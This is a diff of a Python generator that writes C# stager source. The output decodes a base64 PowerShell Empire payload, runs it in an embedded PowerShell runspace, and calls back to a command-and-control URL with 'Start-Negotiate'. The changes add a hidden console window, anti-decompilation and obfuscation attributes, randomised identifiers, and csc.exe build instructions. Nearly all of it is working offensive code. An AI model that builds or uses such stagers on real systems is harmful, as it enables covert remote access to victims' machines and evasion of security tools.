@@ -3,8 +3,13 @@ import argparse
 import random
 
 DEBUG = False
+IPANDPORTURL = None
+CONSOLE_WINDOW = False
+
+
 
 def opening_banner():
+    # powershell makes it look a little crunched
     ret = '''
             ,ooo888888888888888oooo,
           o8888YYYYYY77iiiiooo8888888o
@@ -23,15 +28,17 @@ def opening_banner():
      88888888888888888888888888888888888887
       78888887788788888^;;^888878877888887
        7888878^ ^8788^;;;;;;^878^ ^878877
-         777888o8888^;ii;;ii;^888o87777'''
+         777888o8888^;ii;;ii;^888o87777
+                ^8788^;;;;;;^878^
+                    @vvalien1
+         '''
     ret += "\n\n"
     return ret
     
 def finish_csc():
-    # ` is for multi line PS commands, ^ for cmd.exe
     ret = """
-[*] On Windows To Compile:
---------------------------
+[*] On Windows To Compile: (mind the ticks:)
+--------------------------------------------
 C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe `
 /r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll `
 /res:ModifyMe.rc /out:"{0}.exe" /platform:x86 "{0}.cs"
@@ -44,7 +51,7 @@ def finish_emp():
 ----------------------------
 listeners
 uselistener http
-set Host {0}
+set Host .
 etc..
 etc...
 etc...."""
@@ -64,7 +71,12 @@ using System.Reflection;
 [assembly: AssemblyTrademark("")]
 [assembly: AssemblyCulture("")]
 [assembly: AssemblyVersion("1.0.0.0")]
-[assembly: AssemblyFileVersion("1.0.0.0")]'''
+[assembly: AssemblyFileVersion("1.0.0.0")]
+[assembly: SuppressIldasm()] // looks interstring no?
+[assembly: ObfuscateAssemblyAttribute(true, StripAfterObfuscation=true)] // lol thanks MS (used externally)
+// https://docs.microsoft.com/en-us/dotnet/framework/tools/sn-exe-strong-name-tool
+// [assembly: AssemblyKeyFileAttribute("keyfile.snk")]
+'''
     return ret
 
 def rand_str():
@@ -88,8 +100,7 @@ def write_file(fname, data):
     o.write(data)
     o.close()
 
-def setupCSfile():
-    TheMoneyShot = "AAAABBBBCCCCDDDDEEEEFFFF"
+def setupCSfile(TheMoneyShot = 'AEkAbQBTAG8AcgByAHkARABhAHYAZQA='):
     NamespaceName                 = random_names("NamespaceName")
     ClassName                     = random_names("ClassName")
     RunPSName                     = random_names("RunPSName")
@@ -100,6 +111,9 @@ def setupCSfile():
     ResultsName                   = random_names("ResultsName")
     String64                      = random_names("String64")
     NewString64                   = random_names("NewString64")
+    WindowPoint                   = random_names("WindowPoint")
+    WindowInt                     = random_names("WindowInt")
+    ConsoleWin                    = random_names("ConsoleWindow")
     SecString  =  emp_key
     ret = "namespace %s\n{\n" % NamespaceName
     ret += " class %s\n {\n" % ClassName
@@ -112,26 +126,46 @@ def setupCSfile():
     ret += "   %s.Commands.AddScript(%s);\n" % (PipelineName, CommandString)
     ret += "   %s.Commands.Add(\"Out-String\");\n" % PipelineName
     ret += "   System.Collections.ObjectModel.Collection<System.Management.Automation.PSObject> %s = %s.Invoke();\n" % (ResultsName, PipelineName)
-    ret += "   %s.Close();\n  }\n" % PipelineName
+    ret += "   %s.Dispose();\n  }\n" % PipelineName # woopse
     ret += "  static void Main()\n  {\n"
+    if CONSOLE_WINDOW:
+       ret += "   System.IntPtr %s = GetConsoleWindow();\n   ShowWindow(%s, 0);\n" %(ConsoleWin, ConsoleWin)
     ret += "   string %s = \"%s\";\n" % (String64, TheMoneyShot)
-    ret += "   string %s = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(%s));\n" % (NewString64, String64)
-    ret += "   %s += \"Start-Negotiate -s '%s' -SK '%s'\";\n" % (NewString64, IPANDPORTURL, SecString)
+    ret += "   string %s = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(%s));\n" % (NewString64, String64)
+    if IPANDPORTURL:
+        ret += "   %s += \"Start-Negotiate -s '%s' -SK '%s'\";\n" % (NewString64, IPANDPORTURL, SecString)
     ret += "   %s(%s);\n" %(RunPSName, NewString64)
-    ret += "  }\n }\n}\n"
+    ret += "  }\n"
+    if CONSOLE_WINDOW:
+        ret += "   [System.Runtime.InteropServices.DllImport(\"kernel32\")] private static extern System.IntPtr GetConsoleWindow();\n"
+        ret += "   [System.Runtime.InteropServices.DllImport(\"user32.dll\")] private static extern bool ShowWindow(System.IntPtr %s, int %s);\n" % (WindowPoint, WindowInt)
+    ret += " }\n}"
     return ret
 
 if __name__ == '__main__':
-    # print(opening_banner())
-    usage_text = "%s http(s):\\<url>:<port> <output_file>\n" % (sys.argv[0])
+    print(opening_banner())
+    usage_text = "%s http(s):\\\\<url>:<port> <output_file>\n" % (sys.argv[0])
+    usage_text += "usage: %s -p <BASE64_EMPIRE_STRING> -o <OUTPUT_FILE>\n" % (sys.argv[0])
     parser = argparse.ArgumentParser(usage=usage_text)
-    if len(sys.argv) < 3:
+    parser.add_argument('-d', action='store_true', default=False, dest='debug', help='Debuging')
+    parser.add_argument('-p', type=str, required=False, help='B64 PS-Empire string')
+    parser.add_argument('-o', type=str, required=False, help='Output File')
+    parser.add_argument('-w', action='store_true', default=False, dest='window', help='Hide Console Window')
+    nargs              = parser.parse_args() # all args
+    if len(sys.argv) < 3 or nargs.p == None:
         parser.print_help()
         sys.exit(0)
-    IPANDPORTURL       = sys.argv[1]
-    output_file        = sys.argv[2]
-    payload = setupCSfile()
+    if nargs.p == None:
+        IPANDPORTURL       = sys.argv[1]
+        output_file        = sys.argv[2]
+        payload            = setupCSfile()
+    else:
+        DEBUG              = nargs.debug
+        pshell             = nargs.p
+        output_file        = nargs.o
+        CONSOLE_WINDOW     = nargs.window
+        payload            = setupCSfile(pshell)
     write_file(output_file, payload)
     write_file("ModifyMe.rc", SharpRC())
     print(finish_csc().format(output_file.split('.')[0]))
-    print(finish_emp())
+    # print(finish_emp())
